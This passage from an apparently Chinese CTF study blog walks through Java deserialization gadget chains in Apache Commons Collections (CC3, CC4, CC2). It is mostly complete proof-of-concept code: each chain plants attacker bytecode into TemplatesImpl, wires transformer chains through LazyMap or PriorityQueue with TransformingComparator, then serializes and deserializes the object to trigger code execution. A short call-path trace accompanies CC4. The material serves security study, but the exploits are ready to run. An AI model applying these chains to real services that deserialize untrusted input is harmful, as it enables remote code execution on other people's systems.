<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3TEST</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class c= TemplatesImpl.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;Boogipop&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\\\CTF学习笔记\\\\Java\\\\CC1-NEW\\\\target\\\\classes\\\\EXEC.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line">        <span class="comment">//由于还没进行反序列化，所以手动给_tfactory赋值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//CC1后半</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)); <span class="comment">//随便改成什么Transformer</span></span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazymap,chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671208414268-21393e2e-ab09-4382-857b-b7fbbbb9bb94.png#averageHue=%234b4a48&clientId=udbbfbc4e-b37b-4&from=paste&height=390&id=u30cc3d64&name=image.png&originHeight=488&originWidth=842&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75706&status=done&style=none&taskId=u16bff3e6-de9b-4ce9-8ace-7c3ad912d54&title=&width=673.6" alt="image.png"><br>同样成功触发，最后的思路图为：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671208844263-5cf3c80f-91b6-42a8-864b-a343d02fa4a3.png#averageHue=%23f5f5f5&clientId=udbbfbc4e-b37b-4&from=paste&height=587&id=uc991cfc2&name=image.png&originHeight=734&originWidth=1668&originalType=binary&ratio=1&rotation=0&showTitle=false&size=131263&status=done&style=none&taskId=u10c7d954-e236-4ea0-a642-b8e843f2a55&title=&width=1334.4" alt="image.png"></p>
<h2 id="1X2-4-CC4"><a href="#1X2-4-CC4" class="headerlink" title="1X2.4 CC4"></a>1X2.4 CC4</h2><p>首先CC4需要的commoncollection4的依赖：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<p>言简意赅的来说CC4就是CC3前半段不动，后半段修改一些东西，在调用CaninedTransformer的transform方法上有所不同,直接先放POC后分析：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class c= TemplatesImpl.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;Boogipop&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\\\CTF学习笔记\\\\Java\\\\CC1-NEW\\\\target\\\\classes\\\\EXEC.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line">        <span class="comment">//由于还没进行反序列化，所以手动给_tfactory赋值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        TransformingComparator transformingComparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        PriorityQueue priorityQueue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        Class tc=transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(transformingComparator,chainedTransformer);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>从chainedtransformer那里开始改动一小部分，那么思路也就回到了如何调用transform方法上了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671270022160-64830796-fc38-41d7-9d5c-e72c2ed8fd26.png#averageHue=%23565042&clientId=ua04e3dd5-9b07-4&from=paste&height=398&id=u20d33e35&name=image.png&originHeight=498&originWidth=1848&originalType=binary&ratio=1&rotation=0&showTitle=false&size=116774&status=done&style=none&taskId=ua09b0517-7aad-4cc8-8145-2d91cddb90f&title=&width=1478.4" alt="image.png"><br>在<code>TransformingComparator.compare</code>方法中调用，因此跟进看看谁调用了compare：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671270064275-2c9a3094-72b4-4aa9-976a-c4a091b9ccdb.png#averageHue=%23554f43&clientId=ua04e3dd5-9b07-4&from=paste&height=434&id=u102d21d8&name=image.png&originHeight=543&originWidth=1822&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112444&status=done&style=none&taskId=ub0533142-e75d-49e6-abc6-83b57d269ee&title=&width=1457.6" alt="image.png"><br>在<code>PriorityQueue.siftUpUsingComparator</code>中调用，继续看谁调用了<code>siftUpUsingComparator</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671270154299-d6f93e89-4a16-4f1e-90d0-238a01af4ee2.png#averageHue=%23605544&clientId=ua04e3dd5-9b07-4&from=paste&height=226&id=ue5a37e1c&name=image.png&originHeight=282&originWidth=1306&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63225&status=done&style=none&taskId=u951734c2-fb00-4f85-89c8-b2be2a7b8e5&title=&width=1044.8" alt="image.png"><br>在该类的siftDown调用，继续找：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671270168439-48abbefe-39fa-4e51-bb62-3ffa5831b0eb.png#averageHue=%232c2c2c&clientId=ua04e3dd5-9b07-4&from=paste&height=199&id=udca7f9e9&name=image.png&originHeight=249&originWidth=988&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24682&status=done&style=none&taskId=u1feff701-a673-4a67-9132-33a53b87eff&title=&width=790.4" alt="image.png"><br>在heapify方法调用siftDown，继续：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671270200050-cf6365a6-3feb-4782-9c72-861bd7d29108.png#averageHue=%235d5044&clientId=ua04e3dd5-9b07-4&from=paste&height=593&id=uf4460fa6&name=image.png&originHeight=741&originWidth=1819&originalType=binary&ratio=1&rotation=0&showTitle=false&size=190002&status=done&style=none&taskId=ube65634e-ba12-4a03-bdbd-389349e19ba&title=&width=1455.2" alt="image.png"><br>在readObject里调用了heapify，流程结束<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671271693175-e005b8cb-3465-4e8a-9b4f-3a21c7907432.png#averageHue=%23f5f5f5&clientId=ua04e3dd5-9b07-4&from=paste&height=634&id=u4960022c&name=image.png&originHeight=792&originWidth=1529&originalType=binary&ratio=1&rotation=0&showTitle=false&size=147230&status=done&style=none&taskId=ue04ebffe-a75c-4b35-aeef-c47a0233a3e&title=&width=1223.2" alt="image.png"></p>
<h2 id="1X2-5-CC2"><a href="#1X2-5-CC2" class="headerlink" title="1X2.5 CC2"></a>1X2.5 CC2</h2><p>CC2与CC4不同的地方就是后半些许不同，没有用chainedtrainsform，直接用invokertransformer<br>POC：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class c= TemplatesImpl.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;Boogipop&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\\\CTF学习笔记\\\\Java\\\\CC1-NEW\\\\target\\\\classes\\\\EXEC.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"><span class="comment">//        由于还没进行反序列化，所以手动给_tfactory赋值</span></span><br><span class="line"><span class="comment">//        Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;);</span></span><br><span class="line"><span class="comment">//        tfactory.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        tfactory.set(templates,new TransformerFactoryImpl());</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">        InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        TransformingComparator transformingComparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        PriorityQueue priorityQueue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        Class tc=transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>); </span><br><span class="line">        comparator.set(transformingComparator,invokerTransformer);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
